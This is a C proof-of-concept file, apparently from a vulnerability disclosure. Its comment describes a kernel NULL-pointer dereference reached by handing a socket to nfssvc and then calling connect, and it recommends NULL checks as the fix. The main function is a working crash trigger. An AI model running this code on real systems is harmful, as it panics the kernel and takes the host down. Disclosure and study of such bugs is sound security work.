/*
 * concrash.c
 *     Cause a panic using nfssvc system call after it receives a socket

Description:
When you pass a socket to the NFS subsystem in the kernel, it
uses nfscbd_addsock() to claim the socket.  This results in the
fp->f_data being set to zero.  If this socket is later used in
"normal" socket system calls that access f_data, a NULL pointer
dereference will result in a kernel panic.

This is triggerable through many system calls such as
getsockopt, setsockopt, connect, listen, bind, send,
recv and nfssvc itself.

This is of low risk since it requires access to privileged
operations in the nfssvc system call.

Recommendation:
Consider updating getsock_cap to return an error if f_type is DTYPE_SOCKET
but f_data is NULL.  This indicates that the socket has been stolen
by the kernel.

Update all socket operations that access f_data to first check
if f_data is NULL and return an error in this case.
 */


#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <sys/param.h>
#include <sys/mount.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <fs/nfs/nfskpiport.h>
#include <fs/nfs/nfsproto.h>
#include <fs/nfs/nfs.h>
#include <nfs/nfssvc.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    struct nfscbd_args args;
    char buf[8] = {0};
    int fd, x;

    fd = socket(AF_INET6, SOCK_STREAM, 0);
    if(fd == -1) exit(1);
    printf("fd %d\n", fd);

    // give it over to the kernel
    args.sock = fd;
    x = nfssvc(NFSSVC_CBADDSOCK, &args);
    printf("nfssvc %d\n", x);

    x = connect(fd, (struct sockaddr *)buf, 5);
    printf("res %d\n", x);
    return 0;
}
